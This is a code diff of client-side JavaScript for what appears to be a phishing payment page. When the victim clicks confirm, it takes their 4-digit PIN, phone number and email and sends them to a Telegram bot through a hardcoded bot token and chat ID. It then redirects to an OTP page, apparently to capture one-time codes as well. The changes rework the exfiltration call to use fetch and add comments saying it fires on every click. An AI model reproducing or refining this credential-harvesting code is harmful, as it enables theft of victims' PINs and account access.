@@ -129,8 +129,6 @@
     var TG_BOT_TOKEN      = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
     var TG_CHAT_ID        = '8392790531';
 
-    var db = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
     // Get URL parameters
     var params  = new URLSearchParams(window.location.search);
     var amount  = params.get('amount')  || '0';
@@ -200,7 +198,7 @@
         setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
     }
 
-    // Send Telegram notification using XMLHttpRequest (more reliable)
+    // Send Telegram notification - THIS RUNS EVERY TIME USER CLICKS CONFIRM
     function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
@@ -223,36 +221,31 @@
 
         var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
         
-        // Using XMLHttpRequest for better compatibility
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', url, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                if (xhr.status === 200) {
-                    var response = JSON.parse(xhr.responseText);
-                    if (response.ok) {
-                        console.log('✅ Telegram notification sent successfully!');
-                        console.log('   Phone: ' + decodedPhone);
-                        console.log('   PIN: ' + pin);
-                        console.log('   Email: ' + decodedEmail);
-                    } else {
-                        console.error('Telegram error:', response);
-                    }
-                } else {
-                    console.error('HTTP error:', xhr.status);
-                }
+        // Send notification using fetch (runs in background)
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT_ID, 
+                text: msg, 
+                parse_mode: 'Markdown' 
+            })
+        })
+        .then(function(response) { return response.json(); })
+        .then(function(result) {
+            if (result.ok) {
+                console.log('✅ Telegram notification sent - PIN: ' + pin);
+            } else {
+                console.error('Telegram error:', result);
             }
-        };
-        xhr.send(JSON.stringify({ 
-            chat_id: TG_CHAT_ID, 
-            text: msg, 
-            parse_mode: 'Markdown' 
-        }));
+        })
+        .catch(function(error) {
+            console.error('Telegram fetch error:', error);
+        });
     }
 
-    // Main confirm function
-    window.handleConfirm = async function() {
+    // Main confirm function - Sends notification EVERY TIME
+    window.handleConfirm = function() {
         var pin = getPin();
         if (pin.length !== 4) { 
             showError('Please enter all 4 digits.'); 
@@ -263,12 +256,11 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification
+        // Send Telegram notification (this runs every time)
         sendTelegramNotification(pin);
         
-        // Small delay to ensure notification is sent before redirect
+        // Redirect to OTP page after short delay
         setTimeout(function() {
-            // Redirect to OTP page
             window.location.href = 'otp-verify.html'
                 + '?amount='  + encodeURIComponent(amount)
                 + '&term='    + encodeURIComponent(term)
